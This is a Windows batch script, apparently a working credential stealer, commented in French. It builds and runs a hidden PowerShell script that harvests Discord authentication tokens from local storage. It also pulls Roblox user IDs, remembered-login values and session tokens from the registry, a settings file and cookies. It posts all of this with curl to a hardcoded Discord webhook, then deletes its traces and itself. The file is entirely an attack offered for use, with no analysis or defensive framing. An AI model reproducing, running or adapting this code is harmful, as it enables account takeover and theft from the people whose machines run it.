@echo off
setlocal enabledelayedexpansion
:: PALOFSC - EXFILTRATION AMELIOREE (RECHERCHE ELARGIE)

set "WEBHOOK=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 1 : CREER LE SCRIPT POWERSHELL AVEC RECHERCHE DANS TOUS LES FICHIERS
set "psfile=%TEMP%\extract_all.ps1"
set "outfile=%TEMP%\tokens_all.txt"
(
echo $paths = @(
echo     "$env:APPDATA\Discord\Local Storage\leveldb",
echo     "$env:APPDATA\discordptb\Local Storage\leveldb",
echo     "$env:APPDATA\discordcanary\Local Storage\leveldb"
echo )
echo $tokens = @()
echo $pattern = '[a-zA-Z0-9_\-]{20,60}\.[a-zA-Z0-9_\-]{6,20}\.[a-zA-Z0-9_\-]{20,80}'
echo foreach ($p in $paths) {
echo     if (Test-Path $p) {
echo         Get-ChildItem $p -File ^| ForEach-Object {
echo             Select-String -Path $_.FullName -Pattern $pattern -AllMatches ^| ForEach-Object { $_.Matches.Value }
echo         } ^| ForEach-Object { $tokens += $_ }
echo     }
echo }
echo # Deduplication
echo $tokens = $tokens ^| Select-Object -Unique
echo $tokens -join ' ' ^| Out-File -FilePath '%outfile%' -Encoding utf8
) > "%psfile%"

:: ETAPE 2 : EXECUTER LE POWERSHELL (SANS LOGO)
powershell -NoLogo -NoProfile -ExecutionPolicy Bypass -File "%psfile%" 2>nul

:: ETAPE 3 : LIRE LE FICHIER DE SORTIE
set "tokens="
if exist "%outfile%" (
    for /f "usebackq delims=" %%a in ("%outfile%") do set "tokens=%%a"
    del /f /q "%outfile%" >nul 2>&1
)
del /f /q "%psfile%" >nul 2>&1

:: ETAPE 4 : ROBLOX - RECHERCHE MULTIPLE (REGISTRE + FICHIER XML + COOKIES)
set "roblox_user="
set "roblox_pass="
set "roblox_token="
:: UserID
for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "UserID" 2^>nul') do set "roblox_user=%%a"
:: RememberMe (mot de passe hashé)
for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "RememberMe" 2^>nul') do set "roblox_pass=%%a"
:: Token depuis le fichier XML
if exist "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" (
  for /f "tokens=2 delims=<>" %%a in ('findstr /r /c:"<token>" "%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml" 2^>nul') do set "roblox_token=%%a"
)
:: Fallback : chercher .ROBLOSECURITY dans les cookies (si stocké)
if "!roblox_token!"=="" (
  for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Cookies" 2^>nul') do set "cookiepath=%%a"
  if defined cookiepath (
    for /f "delims=" %%a in ('findstr /i "ROBLOSECURITY" "%cookiepath%\*.txt" 2^>nul') do (
      set "line=%%a"
      for /f "tokens=2 delims== " %%b in ("!line!") do set "roblox_token=%%b"
    )
  )
)

:: ETAPE 5 : CONSTRUCTION DU MESSAGE
set "msg="
if not "!tokens!"=="" set "msg=!msg!Tokens Discord : !tokens!\n"
if not "!roblox_user!"=="" set "msg=!msg!Roblox UserID : !roblox_user!\n"
if not "!roblox_pass!"=="" set "msg=!msg!Roblox RememberMe : !roblox_pass!\n"
if not "!roblox_token!"=="" set "msg=!msg!Roblox Token : !roblox_token!\n"
if "!msg!"=="" set "msg=Aucune donnee collectee.\n"

:: Echappement JSON
set "msg=!msg:"=\"!"
set "msg=!msg:\n=\\n!"

:: ETAPE 6 : ENVOI VIA CURL
curl -s -H "Content-Type: application/json" -d "{\"content\":\"%msg%\"}" "%WEBHOOK%" >nul 2>&1

:: ETAPE 7 : NETTOYAGE
set "tokens="
set "roblox_user="
set "roblox_pass="
set "roblox_token="
set "msg="
del /f /q "%~f0" >nul 2>&1
exit /b 0
